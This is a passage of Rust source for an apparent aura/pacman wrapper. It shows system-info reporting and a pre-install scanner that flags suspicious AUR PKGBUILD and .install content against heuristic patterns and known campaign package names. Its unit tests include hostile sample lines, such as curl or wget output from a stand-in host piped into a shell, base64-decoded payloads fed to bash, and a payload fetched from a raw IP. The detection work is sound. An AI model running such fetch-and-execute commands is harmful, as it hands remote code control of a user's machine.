/// later file able to override values set before it. We let bash do the
/// actual sourcing (arrays, `$(nproc)`, quoting rules) instead of
/// hand-parsing shell syntax ourselves, then just read the results back.
fn read_makepkg_vars() -> HashMap<String, String> {
    let watched = [
        "CARCH", "CHOST", "CFLAGS", "CXXFLAGS", "LDFLAGS", "RUSTFLAGS",
        "MAKEFLAGS", "OPTIONS", "BUILDENV", "PKGEXT",
    ];
    let mut dump = String::new();
    for v in &watched {
        dump.push_str(&format!("echo \"{v}=${{{v}[*]}}\"\n"));
    }

    let script = format!(
        r#"
source {sys} 2>/dev/null
if [ -n "$XDG_CONFIG_HOME" ] && [ -f "$XDG_CONFIG_HOME/pacman/makepkg.conf" ]; then
    source "$XDG_CONFIG_HOME/pacman/makepkg.conf" 2>/dev/null
elif [ -f "$HOME/.config/pacman/makepkg.conf" ]; then
    source "$HOME/.config/pacman/makepkg.conf" 2>/dev/null
fi
[ -f "$HOME/.makepkg.conf" ] && source "$HOME/.makepkg.conf" 2>/dev/null
{dump}"#,
        sys = MAKEPKG_CONF_SYSTEM,
        dump = dump,
    );

    let mut map = HashMap::new();
    if let Ok(output) = Command::new(BASH_BIN)
        .arg("-c")
        .arg(&script)
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
    {
        if output.status.success() {
            for line in String::from_utf8_lossy(&output.stdout).lines() {
                if let Some((k, v)) = line.split_once('=') {
                    map.insert(k.to_string(), v.to_string());
                }
            }
        }
    }
    map
}

/// The path to whichever user-level makepkg.conf override would actually
/// take effect, mirroring makepkg's own lookup order.
fn user_makepkg_conf_path() -> String {
    if let Ok(xdg) = std::env::var("XDG_CONFIG_HOME") {
        return format!("{}/pacman/makepkg.conf", xdg);
    }
    if let Ok(home) = std::env::var("HOME") {
        return format!("{}/.config/pacman/makepkg.conf", home);
    }
    String::new()
}

/// Parse /etc/pacman.conf for repository sections in file order — which is
/// also pacman's own resolution priority: on a name clash between repos,
/// the one listed first wins. Each repo's Server/Include lines are kept;
/// Include lines are resolved one level deep (into the mirrorlist) so the
/// actual mirror is visible instead of just the pointer file.
fn parse_pacman_repos() -> Vec<(String, Vec<String>)> {
    let mut repos: Vec<(String, Vec<String>)> = Vec::new();
    let Ok(file) = fs::File::open(PACMAN_CONF) else { return repos; };
    let reader = io::BufReader::new(file);

    let mut current: Option<(String, Vec<String>)> = None;
    for line in reader.lines().map_while(Result::ok) {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        if trimmed.starts_with('[') && trimmed.ends_with(']') {
            if let Some(repo) = current.take() {
                repos.push(repo);
            }
            let name = trimmed.trim_start_matches('[').trim_end_matches(']').to_string();
            if name != "options" {
                current = Some((name, Vec::new()));
            }
            continue;
        }
        let Some((_, lines)) = current.as_mut() else { continue };
        if let Some((key, val)) = trimmed.split_once('=') {
            let key = key.trim();
            let val = val.trim();
            if key == "Include" {
                let resolved = fs::read_to_string(val).ok().and_then(|inc| {
                    inc.lines()
                        .map(str::trim)
                        .find(|l| l.starts_with("Server") && !l.starts_with('#'))
                        .map(str::to_string)
                });
                match resolved {
                    Some(server) => lines.push(format!("Include = {}  ({})", val, server)),
                    None => lines.push(format!("Include = {}", val)),
                }
            } else if key == "Server" {
                lines.push(format!("Server = {}", val));
            }
        }
    }
    if let Some(repo) = current.take() {
        repos.push(repo);
    }
    repos
}

fn read_meminfo() -> Option<(u64, u64, u64, u64)> {
    let content = fs::read_to_string("/proc/meminfo").ok()?;
    let mut mem_total = 0u64;
    let mut mem_free = 0u64;
    let mut swap_total = 0u64;
    let mut swap_free = 0u64;
    for line in content.lines() {
        let mut parts = line.split_whitespace();
        let key = parts.next().unwrap_or("");
        let val: u64 = parts.next().and_then(|v| v.parse().ok()).unwrap_or(0);
        match key {
            "MemTotal:" => mem_total = val,
            "MemFree:" => mem_free = val,
            "SwapTotal:" => swap_total = val,
            "SwapFree:" => swap_free = val,
            _ => {}
        }
    }
    Some((mem_total, mem_free, swap_total, swap_free))
}

fn world_set_stats() -> Option<(usize, u64)> {
    let meta = fs::metadata(WORLD_SET_FILE).ok()?;
    let content = fs::read_to_string(WORLD_SET_FILE).ok()?;
    let count = content.lines().filter(|l| !l.trim().is_empty()).count();
    Some((count, meta.len()))
}

/// `emerge --info`: a system/build-environment summary in the spirit of
/// Gentoo's `emerge --info`, adapted to aura/pacman. Not a literal
/// impersonation of Portage's output — field names are relabeled where the
/// underlying concept differs — but the overall shape (uname/mem block,
/// Repositories block, flag dump, world set) is intentionally familiar.
fn print_system_info() {
    let aura_ver = cmd_stdout(AURA_BIN, &["--version"])
        .and_then(|s| extract_version_token(&s))
        .map(|v| format!("aura {}", v))
        .unwrap_or_else(|| "aura unknown".to_string());
    let pacman_ver = cmd_stdout(PACMAN_BIN, &["--version"])
        .and_then(|s| {
            s.lines().find_map(|l| {
                let lower = l.to_lowercase();
                lower.find("pacman").map(|idx| l[idx..].trim().to_string())
            })
        })
        .unwrap_or_else(|| "unknown".to_string());
    let kernel = cmd_stdout(UNAME_BIN, &["-r"]).unwrap_or_else(|| "unknown".to_string());
    let arch = cmd_stdout(UNAME_BIN, &["-m"]).unwrap_or_else(|| "unknown".to_string());
    let uname_full = cmd_stdout(UNAME_BIN, &["-srvm"]).unwrap_or_else(|| "unknown".to_string());
    let cpu_model = fs::read_to_string("/proc/cpuinfo")
        .ok()
        .and_then(|c| {
            c.lines()
                .find(|l| l.starts_with("model name"))
                .and_then(|l| l.split_once(':').map(|(_, v)| v.trim().to_string()))
        })
        .unwrap_or_else(|| "unknown".to_string());

    println!(
        "{} {} ({}, {}, linux {}, {})",
        "aura-emerge".bold(),
        env!("CARGO_PKG_VERSION"),
        aura_ver,
        pacman_ver,
        kernel,
        arch
    );
    println!("{}", "=".repeat(70));
    println!("System uname: {}", uname_full);
    println!("CPU: {}", cpu_model);
    if let Some((mem_total, mem_free, swap_total, swap_free)) = read_meminfo() {
        println!("KiB Mem:    {} total, {} free", mem_total, mem_free);
        println!("KiB Swap:   {} total, {} free", swap_total, swap_free);
    }
    println!();

    println!("Repositories:");
    println!();
    let repos = parse_pacman_repos();
    if repos.is_empty() {
        println!("    (could not read {})", PACMAN_CONF);
    }
    for (i, (name, lines)) in repos.iter().enumerate() {
        println!("{}", name);
        println!("    priority: {} (order of appearance in {})", i + 1, PACMAN_CONF);
        for l in lines {
            println!("    {}", l);
        }
        println!();
    }

    let user_conf = user_makepkg_conf_path();
    let user_conf_active = !user_conf.is_empty() && std::path::Path::new(&user_conf).exists();
    if user_conf_active {
        println!("makepkg.conf: {} -> overridden by {}", MAKEPKG_CONF_SYSTEM, user_conf);
    } else {
        println!("makepkg.conf: {} (no user override present)", MAKEPKG_CONF_SYSTEM);
    }
    println!();

    let vars = read_makepkg_vars();
    let get = |k: &str| vars.get(k).cloned().unwrap_or_default();
    for key in ["CARCH", "CHOST", "CFLAGS", "CXXFLAGS", "LDFLAGS", "RUSTFLAGS",
                "MAKEFLAGS", "OPTIONS", "BUILDENV", "PKGEXT"] {
        println!("{}=\"{}\"", key, get(key));
    }
    println!();

    match world_set_stats() {
        Some((count, size)) => println!(
            "world.set: {} package(s), {} bytes ({})",
            count, size, WORLD_SET_FILE
        ),
        None => println!("world.set: not found ({})", WORLD_SET_FILE),
    }
}

// ── AUR PKGBUILD safety scanner ─────────────────────────────────────────────
//
// Runs automatically before every AUR install (`aura -A ...`). Fetches each
// package's raw PKGBUILD from the AUR cgit mirror (no `git clone`, just the
// plain file) and greps it for a handful of red-flag patterns commonly seen
// in malicious/compromised PKGBUILDs. This is *not* a substitute for reading
// the PKGBUILD yourself — it only catches crude, textbook-obvious tricks —
// but it's a cheap tripwire against copy-pasted or automated garbage.
//
// On any hit, the install is blocked and the user must type an explicit "y"
// to proceed anyway. Anything else (including empty input / EOF) aborts.

const CURL_BIN: &str = "/usr/bin/curl";

/// Download an arbitrary raw file from a package's AUR git tree via the
/// cgit web UI (e.g. "PKGBUILD" or a referenced "<pkg>.install" hook).
/// Returns None on any network/parse failure (missing file, no
/// connectivity, AUR down, etc.) — callers should *not* treat that as a
/// clean scan, just as "nothing to check".
fn fetch_aur_file(pkg: &str, filename: &str) -> Option<String> {
    let url = format!(
        "https://aur.archlinux.org/cgit/aur.git/plain/{}?h={}",
        filename, pkg
    );
    let output = Command::new(CURL_BIN)
        .args(["-sfL", "--max-time", "10", &url])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    let text = String::from_utf8_lossy(&output.stdout).to_string();
    if text.trim().is_empty() {
        None
    } else {
        Some(text)
    }
}

fn fetch_aur_pkgbuild(pkg: &str) -> Option<String> {
    fetch_aur_file(pkg, "PKGBUILD")
}

/// Extract the `.install` hook script filename referenced by a PKGBUILD's
/// `install=` variable, if any. That script runs pre/post install/upgrade/
/// remove — as part of the pacman transaction, i.e. effectively as root —
/// so it's at least as sensitive an execution point as build()/package(),
/// and the June 2026 "Atomic Arch" AUR campaign specifically used both
/// PKGBUILD *and* `.install` hooks to smuggle in its payload.
fn parse_install_filename(pkgbuild_text: &str) -> Option<String> {
    for line in pkgbuild_text.lines() {
        let l = line.trim();
        if l.starts_with('#') {
            continue;
        }
        if let Some(rest) = l.strip_prefix("install=") {
            let name = rest.trim().trim_matches('\'').trim_matches('"');
            if !name.is_empty() {
                return Some(name.to_string());
            }
        }
    }
    None
}

/// `curl ... | sh` / `wget ... | bash` / `... | source` style remote-code-exec
/// pipelines. Deliberately loose (matches curl/wget followed eventually by a
/// pipe into a shell) since attackers vary whitespace and flags constantly.
fn curl_pipe_shell_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    let has_fetcher = lower.contains("curl ") || lower.contains("curl\t")
        || lower.contains("wget ") || lower.contains("wget\t");
    if !has_fetcher || !lower.contains('|') {
        return false;
    }
    let after_pipe = lower.splitn(2, '|').nth(1).unwrap_or("");
    ["sh", "bash", "zsh", "source", "."].iter().any(|shell| {
        after_pipe.split_whitespace().next() == Some(shell)
    })
}

#[cfg(test)]
fn is_curl_pipe_shell(source: &str) -> bool {
    source.lines().any(curl_pipe_shell_line)
}

/// Same check as `is_curl_pipe_shell`, but returns the 1-indexed line
/// number of the first match instead of a bare bool, so alert output can
/// point at the exact offending line.
fn line_of_curl_pipe_shell(source: &str) -> Option<usize> {
    source.lines().position(curl_pipe_shell_line).map(|i| i + 1)
}

/// `base64 -d` / `base64 --decode` — near-universal marker of obfuscated
/// payloads stashed in a PKGBUILD (legit PKGBUILDs essentially never need
/// this).
fn base64_decode_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    lower.contains("base64 -d") || lower.contains("base64 --decode")
        || lower.contains("base64 -D")
}

#[cfg(test)]
fn is_base64_decode(source: &str) -> bool {
    source.lines().any(base64_decode_line)
}

fn line_of_base64_decode(source: &str) -> Option<usize> {
    source.lines().position(base64_decode_line).map(|i| i + 1)
}

/// `chmod 777` / `chmod -R 777` (and equivalent a+rwx) — overly permissive
/// perms with no legitimate reason to appear in a build script.
fn chmod_777_line(line: &str) -> bool {
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    lower.contains("chmod") && (lower.contains("777") || lower.contains("a+rwx"))
}

#[cfg(test)]
fn is_chmod_777(source: &str) -> bool {
    source.lines().any(chmod_777_line)
}

fn line_of_chmod_777(source: &str) -> Option<usize> {
    source.lines().position(chmod_777_line).map(|i| i + 1)
}

/// A bare dotted-quad IPv4 literal anywhere in the file — legitimate
/// PKGBUILDs fetch sources from named domains, not hardcoded IPs. Simple
/// heuristic: 4 dot-separated 1-3 digit groups, each <= 255, not preceded/
/// followed by another digit or dot (so it doesn't fire on version strings
/// buried in longer numbers).
///
/// Known false positive: a 4-component dotted pkgver/version string where
/// every component happens to be <= 255 (e.g. "1.2.3.4") is indistinguishable
/// from an IP by pure pattern matching and will also flag. That's an
/// acceptable trade-off here — this only produces a review prompt, not a
/// hard failure — but worth knowing if a clean package suddenly needs "y".
fn line_has_raw_ipv4(source: &str) -> bool {
    let bytes = source.as_bytes();
    let is_boundary = |c: Option<u8>| !matches!(c, Some(b) if b.is_ascii_digit() || b == b'.');

    let chars: Vec<char> = source.chars().collect();
    let n = chars.len();
    let mut i = 0;
    while i < n {
        if chars[i].is_ascii_digit() {
            let start = i;
            let mut j = i;
            let mut octets = 0;
            let mut ok = true;
            loop {
                let mut k = j;
                while k < n && chars[k].is_ascii_digit() && k - j < 3 {
                    k += 1;
                }
                if k == j {
                    ok = false;
                    break;
                }
                let octet: u32 = chars[j..k].iter().collect::<String>().parse().unwrap_or(999);
                if octet > 255 {
                    ok = false;
                    break;
                }
                octets += 1;
                j = k;
                if octets == 4 {
                    break;
                }
                if j < n && chars[j] == '.' {
                    j += 1;
                } else {
                    ok = false;
                    break;
                }
            }
            if ok && octets == 4 {
                let before_ok = is_boundary(bytes.get(start.wrapping_sub(1)).copied().filter(|_| start > 0));
                let after_ok = is_boundary(chars.get(j).map(|c| *c as u8));
                let before_ok = start == 0 || before_ok;
                if before_ok && after_ok {
                    return true;
                }
            }
            i = start + 1;
        } else {
            i += 1;
        }
    }
    false
}

#[cfg(test)]
fn contains_raw_ipv4(source: &str) -> bool {
    source.lines().any(line_has_raw_ipv4)
}

fn line_of_raw_ipv4(source: &str) -> Option<usize> {
    source.lines().position(line_has_raw_ipv4).map(|i| i + 1)
}

/// A run of `\xHH` hex-escape sequences long enough to be an encoded
/// payload (e.g. shellcode or a binary stuffed into a string literal) fed
/// to something like `printf`/`echo -e`. Deliberately keyed on the `\x`
/// escape form specifically, *not* on bare long hex strings — bare hex is
/// extremely common in legitimate PKGBUILDs (sha256sums/b2sums checksums,
/// PGP key fingerprints in validpgpkeys, git commit hashes) and flagging
/// those would be pure noise. `\xHH\xHH...` escape sequences have no such
/// legitimate use in a PKGBUILD.
fn hex_escape_payload_line(line: &str) -> bool {
    const THRESHOLD: usize = 8; // consecutive \xHH escapes in one line
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let bytes = l.as_bytes();
    let mut i = 0;
    let mut run = 0usize;
    while i < bytes.len() {
        if bytes[i] == b'\\' && i + 3 < bytes.len() && (bytes[i + 1] == b'x' || bytes[i + 1] == b'X')
            && bytes[i + 2].is_ascii_hexdigit() && bytes[i + 3].is_ascii_hexdigit()
        {
            run += 1;
            if run >= THRESHOLD {
                return true;
            }
            i += 4;
        } else {
            run = 0;
            i += 1;
        }
    }
    false
}

#[cfg(test)]
fn is_hex_escape_payload(source: &str) -> bool {
    source.lines().any(hex_escape_payload_line)
}

fn line_of_hex_escape_payload(source: &str) -> Option<usize> {
    source.lines().position(hex_escape_payload_line).map(|i| i + 1)
}

/// Exact indicators from currently-known, still-circulating AUR
/// supply-chain campaigns. This list *will* go stale as campaigns rotate
/// package names (already true here: wave 1 used "atomic-lockfile", wave 2
/// moved to "js-digest"/"lockfile-js") — it's a targeted catch for known
/// IOCs, not a general defense, but it costs nothing to check and it's a
/// zero-false-positive, high-confidence hit if it ever fires.
///
/// Background: the "Atomic Arch" campaign (disclosed June 11-12, 2026)
/// adopted 400+ orphaned AUR packages and edited their PKGBUILD *or*
/// `.install` hooks to run `npm install atomic-lockfile` / `bun install
/// js-digest` / `lockfile-js` during the build, pulling in a Rust
/// infostealer that loads an eBPF rootkit when it lands as root.
const KNOWN_MALICIOUS_PACKAGE_NAMES: &[&str] = &["atomic-lockfile", "js-digest", "lockfile-js"];

#[cfg(test)]
fn contains_known_malicious_package(source: &str) -> Option<&'static str> {
    KNOWN_MALICIOUS_PACKAGE_NAMES.iter().copied().find(|name| source.contains(name))
}

/// Same check, but returns the 1-indexed line number of the first match
/// alongside the matched name, so alert output can point at the exact line.
fn line_of_known_malicious_package(source: &str) -> Option<(usize, &'static str)> {
    for (i, line) in source.lines().enumerate() {
        if let Some(name) = KNOWN_MALICIOUS_PACKAGE_NAMES.iter().copied().find(|n| line.contains(n)) {
            return Some((i + 1, name));
        }
    }
    None
}

/// `npm install <pkg>` / `npm i <pkg>` / `bun install <pkg>` / `bun add
/// <pkg>` / `yarn add <pkg>` / `pip(3) install <pkg>` / `gem install <pkg>`
/// naming a specific *external* package — as opposed to a bare `npm
/// install` / `npm ci` with no package argument, which just installs a
/// project's own declared package.json deps and is extremely common and
/// legitimate in PKGBUILDs for JS-based projects. Pulling an arbitrary
/// named package from a registry mid-build (especially one unrelated to
/// the package actually being built) is exactly the mechanism the Atomic
/// Arch campaign used. Known trade-off: a PKGBUILD that legitimately
/// installs a *named* build-time tool this way (e.g. a global CLI via
/// `npm install -g typescript`) will also flag — that's an acceptable
/// false positive here, same as the IPv4 heuristic below; this only ever
/// costs a review prompt, never a hard block.
fn foreign_pkg_manager_install_line(line: &str) -> bool {
    const PATTERNS: &[&str] = &[
        "npm install ", "npm i ", "bun install ", "bun add ",
        "yarn add ", "pip install ", "pip3 install ", "gem install ",
    ];
    let l = line.trim();
    if l.starts_with('#') {
        return false;
    }
    let lower = l.to_lowercase();
    for p in PATTERNS {
        if let Some(idx) = lower.find(p) {
            let rest = &l[idx + p.len()..];
            let first_pkg_tok = rest.split_whitespace().find(|t| !t.starts_with('-'));
            if let Some(tok) = first_pkg_tok {
                if !tok.starts_with('.') && !tok.starts_with('/') {
                    return true;
                }
            }
        }
    }
    false
}

#[cfg(test)]
fn is_foreign_pkg_manager_install(source: &str) -> bool {
    source.lines().any(foreign_pkg_manager_install_line)
}

fn line_of_foreign_pkg_manager_install(source: &str) -> Option<usize> {
    source.lines().position(foreign_pkg_manager_install_line).map(|i| i + 1)
}

/// How confident a finding is. `Suspicious` covers the generic, crude-but-
/// common heuristics (curl|sh, base64 -d, chmod 777, a raw IP literal, a
/// hex-escape payload) — each one is a real reason to look twice, but each
/// also has plausible false positives on its own. `AtomicArch` is reserved
/// for an exact IOC hit against a *disclosed, confirmed* campaign — right
/// now that's only `KNOWN_MALICIOUS_PACKAGE_NAMES` — and gets a louder,
/// differently-colored alert since there's essentially no false-positive
/// risk on a literal name match.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
enum Severity {
    Suspicious,
    AtomicArch,
}

#[derive(Clone, Debug)]
struct Finding {
    /// 1-indexed line number the pattern matched on; 0 if not line-specific.
    line: usize,
    message: String,
    severity: Severity,
}

/// Run all heuristics against one PKGBUILD (or `.install` hook — same
/// shell-script surface, same heuristics apply), returning line-numbered,
/// severity-tagged findings (empty vec = clean).
fn scan_pkgbuild_source(source: &str) -> Vec<Finding> {
    let mut findings = Vec::new();
    if let Some(line) = line_of_curl_pipe_shell(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "downloads and pipes a remote script straight into a shell (curl/wget | sh)".to_string(),
        });
    }
    if let Some(line) = line_of_base64_decode(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "decodes a base64 blob (possible obfuscated payload)".to_string(),
        });
    }
    if let Some(line) = line_of_chmod_777(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "sets world-writable/executable permissions (chmod 777)".to_string(),
        });
    }
    if let Some(line) = line_of_raw_ipv4(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "fetches from or references a hardcoded raw IP address instead of a domain".to_string(),
        });
    }
    if let Some(line) = line_of_hex_escape_payload(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "contains a long run of \\xHH hex-escape sequences (possible encoded/obfuscated payload)".to_string(),
        });
    }
    if let Some((line, name)) = line_of_known_malicious_package(source) {
        findings.push(Finding {
            line,
            severity: Severity::AtomicArch,
            message: format!(
                "references '{}' — a known-malicious package name from a documented AUR supply-chain campaign (Atomic Arch, June 2026)",
                name
            ),
        });
    }
    if let Some(line) = line_of_foreign_pkg_manager_install(source) {
        findings.push(Finding {
            line,
            severity: Severity::Suspicious,
            message: "installs a named external package via npm/bun/yarn/pip/gem mid-build — the mechanism the Atomic Arch AUR campaign used to smuggle in its payload".to_string(),
        });
    }
    findings
}

/// Fetch + scan the PKGBUILD — and, if it references one, the `.install`
/// hook — for every package about to be installed from the AUR. If
/// anything suspicious turns up in either file for any package, print the
/// findings and block until the user types an explicit "y". Anything else
/// aborts the whole install (exits the process), matching the "block and
/// require explicit y" behavior the user confirmed.
///
/// Files that couldn't be fetched (network hiccup, AUR down, name not
/// found, split-package headers, no `.install` referenced, etc.) are
/// silently skipped rather than treated as a hit — this scanner only ever
/// adds friction on actual findings, never on lookup failures.
fn scan_aur_pkgbuilds_or_abort(pkgs: &[String]) {
    let mut any_findings = false;
    println!("{} Scanning AUR PKGBUILDs and .install hooks for suspicious patterns...", ">>>".green().bold());

    for pkg in pkgs {
        let pkgbuild_src = match fetch_aur_pkgbuild(pkg) {
            Some(s) => s,
            None => continue,
        };

        // (file label, Finding) pairs across both PKGBUILD and, if present,
        // the referenced .install hook.
        let mut pkg_findings: Vec<(String, Finding)> = scan_pkgbuild_source(&pkgbuild_src)
            .into_iter()
            .map(|f| ("PKGBUILD".to_string(), f))
            .collect();

        if let Some(install_name) = parse_install_filename(&pkgbuild_src) {
            if let Some(install_src) = fetch_aur_file(pkg, &install_name) {
                pkg_findings.extend(
                    scan_pkgbuild_source(&install_src)
                        .into_iter()
                        .map(|f| (install_name.clone(), f)),
                );
            }
        }

        if pkg_findings.is_empty() {
            continue;
        }
        any_findings = true;

        let atomic: Vec<&(String, Finding)> = pkg_findings.iter()
            .filter(|(_, f)| f.severity == Severity::AtomicArch)
            .collect();
        let suspicious: Vec<&(String, Finding)> = pkg_findings.iter()
            .filter(|(_, f)| f.severity == Severity::Suspicious)
            .collect();

        // Highest-confidence alert first: a confirmed IOC match against a
        // disclosed campaign is more actionable than a generic heuristic.
        if !atomic.is_empty() {
            print_finding_block(pkg, "Alert, detected Atomic Arch package", &atomic, true);
        }
        if !suspicious.is_empty() {
            print_finding_block(pkg, "Warning, detected suspicious fragment", &suspicious, false);
        }
    }

    if !any_findings {
        return;
    }

    eprintln!();
    eprintln!(
        "{} One or more AUR packages have PKGBUILD/.install content matching \
        known-suspicious patterns. Review them yourself before proceeding:",
        ">>>".red().bold()
    );
    for pkg in pkgs {
        eprintln!("    https://aur.archlinux.org/cgit/aur.git/tree/PKGBUILD?h={}", pkg);
    }
    eprint!("{} Continue anyway? [y/N] ", ">>>".yellow().bold());
    io::stderr().flush().ok();

    let answer = read_line_raw();
    let confirmed = answer.trim().eq_ignore_ascii_case("y");

    if !confirmed {
        eprintln!("{} Aborted.", ">>>".red().bold());
        std::process::exit(1);
    }
}

/// Print one alert block in the emerge-style `>>> ===...` box.
///
/// `is_atomic` selects the color scheme:
/// - `true` (confirmed Atomic Arch IOC match): on the box header (top bar,
///   headline, bottom bar) the `>>>` arrows are red and the `===` bars are
///   orange, with a yellow headline; on the finding/link lines below, the
///   arrows switch to orange (message text left uncolored). Reserved for a
///   near-zero-false-positive exact name match against a disclosed
///   campaign, so it reads louder than the generic block.
/// - `false` (generic heuristic hit): yellow arrows, bars, and headline
///   throughout — still worth stopping for, but each individual heuristic
///   can have legitimate false positives on its own.
///
/// Each finding line names the file and the 1-indexed line it fired on;
/// the block ends with one direct cgit link per referenced file (PKGBUILD
/// and/or the `.install` hook), anchored to the first flagged line in that
/// file, so the user can jump straight to it instead of reading the whole
/// thing top to bottom.
fn print_finding_block(pkg: &str, headline: &str, findings: &[&(String, Finding)], is_atomic: bool) {
    let bar = "===================================";
    let arrow_str = ">>>";

    eprintln!();
    if is_atomic {
        eprintln!("{} {}", arrow_str.red().bold(), bar.truecolor(255, 140, 0).bold());
        eprintln!("{} {}", arrow_str.red().bold(), format!("{} ({})", headline, pkg).yellow().bold());
        eprintln!("{} {}", arrow_str.red().bold(), bar.truecolor(255, 140, 0).bold());
    } else {
        eprintln!("{} {}", arrow_str.yellow().bold(), bar.yellow().bold());
        eprintln!("{} {}", arrow_str.yellow().bold(), format!("{} ({})", headline, pkg).yellow().bold());
        eprintln!("{} {}", arrow_str.yellow().bold(), bar.yellow().bold());
    }

    let arrow = || if is_atomic { arrow_str.truecolor(255, 140, 0).bold() } else { arrow_str.yellow().bold() };

    let mut files_seen: Vec<&str> = Vec::new();
    for (file, finding) in findings {
        let loc = if finding.line > 0 {
            format!("file {} line {}", file, finding.line)
        } else {
            format!("file {}", file)
        };
        eprintln!("{} {}: {}", arrow(), loc, finding.message);
        if !files_seen.contains(&file.as_str()) {
            files_seen.push(file.as_str());
        }
    }

    for file in files_seen {
        let anchor = findings.iter()
            .find(|(f, fi)| f == file && fi.line > 0)
            .map(|(_, fi)| format!("#n{}", fi.line))
            .unwrap_or_default();
        eprintln!(
            "{} Read full file: https://aur.archlinux.org/cgit/aur.git/tree/{}?h={}{}",
            arrow(), file, pkg, anchor
        );
    }
}

#[cfg(test)]
mod scanner_tests {
    use super::*;

    #[test]
    fn curl_pipe_sh_detected() {
        assert!(is_curl_pipe_shell("curl -sSL https://evil.example.com/x | sh"));
        assert!(is_curl_pipe_shell("wget -qO- http://evil.example.com/x | bash"));
        assert!(!is_curl_pipe_shell("curl -sSL https://example.com/x -o file.tar.gz"));
        assert!(!is_curl_pipe_shell("# curl foo | sh (just a comment)"));
    }

    #[test]
    fn base64_decode_detected() {
        assert!(is_base64_decode("echo $PAYLOAD | base64 -d | bash"));
        assert!(is_base64_decode("base64 --decode < blob.txt > out"));
        assert!(!is_base64_decode("makepkg --version"));
    }

    #[test]
    fn chmod_777_detected() {
        assert!(is_chmod_777("chmod 777 \"$pkgdir/usr/bin/foo\""));
        assert!(is_chmod_777("chmod -R 777 build/"));
        assert!(!is_chmod_777("chmod 755 \"$pkgdir/usr/bin/foo\""));
    }

    #[test]
    fn raw_ipv4_detected() {
        assert!(contains_raw_ipv4("source=(\"http://185.220.101.5/payload.sh\")"));
        assert!(contains_raw_ipv4("192.168.1.1"));
        assert!(!contains_raw_ipv4("source=(\"https://github.com/foo/bar/releases/download/v1.2.3/foo.tar.gz\")"));
        assert!(!contains_raw_ipv4("no ip here at all"));
        // Known false positive, documented on contains_raw_ipv4: a 4-part
        // dotted version where every part is <= 255 reads as an IP too.
        assert!(contains_raw_ipv4("pkgver=1.2.3.4"));
    }

    #[test]
    fn clean_pkgbuild_has_no_findings() {
        let src = r#"
pkgname=foo
pkgver=1.2.3
pkgrel=1
source=("https://github.com/foo/foo/archive/v$pkgver.tar.gz")
sha256sums=('abc123')
build() {
  cd "$pkgname-$pkgver"
  make
}
package() {
  cd "$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
}
"#;
        assert!(scan_pkgbuild_source(src).is_empty());
    }

    #[test]
    fn validpgpkeys_single_line() {
        let src = "validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')";
        assert_eq!(parse_validpgpkeys(src), vec!["ABCDEF0123456789ABCDEF0123456789ABCDEF01"]);
    }

    #[test]
    fn validpgpkeys_multi_line_mixed_quotes() {
        let src = "validpgpkeys=('AAAA0123456789ABCDEF0123456789ABCDEF0123'\n              \"BBBB0123456789ABCDEF0123456789ABCDEF0123\")\n";
        assert_eq!(
            parse_validpgpkeys(src),
            vec![
                "AAAA0123456789ABCDEF0123456789ABCDEF0123",
                "BBBB0123456789ABCDEF0123456789ABCDEF0123"
            ]
        );
    }

    #[test]
    fn validpgpkeys_absent() {
        assert!(parse_validpgpkeys("pkgname=foo\npkgver=1.0\n").is_empty());
    }

    #[test]
    fn known_malicious_package_detected() {
        assert_eq!(
            contains_known_malicious_package("npm install atomic-lockfile"),
            Some("atomic-lockfile")
        );
        assert_eq!(
            contains_known_malicious_package("bun install js-digest"),
            Some("js-digest")
        );
        assert_eq!(contains_known_malicious_package("npm install typescript"), None);
    }

    #[test]
    fn foreign_pkg_manager_install_detected() {
        assert!(is_foreign_pkg_manager_install("npm install atomic-lockfile"));
        assert!(is_foreign_pkg_manager_install("bun add js-digest"));
        assert!(is_foreign_pkg_manager_install("pip install requests"));
        // Local/project installs — no named external package — must NOT flag.
        assert!(!is_foreign_pkg_manager_install("npm install"));
        assert!(!is_foreign_pkg_manager_install("npm ci"));
        assert!(!is_foreign_pkg_manager_install("npm install ."));
        assert!(!is_foreign_pkg_manager_install("npm install --production"));
        assert!(!is_foreign_pkg_manager_install("yarn add ./vendor/local-pkg"));
    }

    #[test]
    fn parse_install_filename_variants() {
        assert_eq!(
            parse_install_filename("pkgname=foo\ninstall=foo.install\npkgver=1.0"),
            Some("foo.install".to_string())
        );
        assert_eq!(
            parse_install_filename("install='foo.install'"),
            Some("foo.install".to_string())
        );
        assert_eq!(parse_install_filename("# install=foo.install"), None);
        assert_eq!(parse_install_filename("pkgname=foo\npkgver=1.0"), None);
    }

    #[test]
    fn hex_escape_payload_detected() {
        assert!(is_hex_escape_payload(
            r#"printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90' > /tmp/x"#
        ));
        // Legitimate hex doesn't use \x escapes: checksums, fingerprints, hashes.
        assert!(!is_hex_escape_payload(
            "sha256sums=('deadbeefcafebabe0011223344556677889900112233445566778899aabbcc')"
        ));
        assert!(!is_hex_escape_payload(
            "validpgpkeys=('ABCDEF0123456789ABCDEF0123456789ABCDEF01')"
        ));
        assert!(!is_hex_escape_payload("commit=1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b"));
        // A couple of stray \x escapes (e.g. one ANSI color code) shouldn't trip it.
        assert!(!is_hex_escape_payload(r#"echo -e '\x1b[32mgreen\x1b[0m'"#));
    }

    #[test]
    fn strip_version_operator_variants() {
        assert_eq!(strip_version_operator("glibc>=2.38"), "glibc");
